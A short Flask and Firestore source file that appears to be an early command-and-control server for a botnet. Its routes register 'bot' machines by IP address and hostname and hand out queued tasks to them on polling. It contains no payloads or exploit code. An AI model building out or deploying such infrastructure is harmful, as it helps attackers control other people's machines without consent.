from flask import Flask, request
import uuid

import firebase_admin
from firebase_admin import credentials, firestore

cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred)

app = Flask(__name__)

db = firestore.client()

# print(db.collections('machines'))


@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"


@app.route('/bot/register/<string:hostname>', methods=['POST'])
def index(hostname):
    id = str(uuid.uuid4())

    db.collection('machines').add({
        'uuid': id,
        'ip': request.remote_addr,
        'hostname': hostname,
        'poll_rate': 5,
        'tasks': [],
    })

    return {'uuid': id}


@app.route('/bot/poll', methods=['GET'])
def poll():
    machine = db.collection('machines').where(
        'uuid', '==', request.headers.get('uuid')).limit(1).get()

    if not machine:
        return {'Error': 'No machines found'}

    if machine[0].to_dict()['tasks']:
        return {'task': machine[0].to_dict()['tasks'][0]}

    return ('', 418)


@app.route('/bot/out')
def out():
    return ''
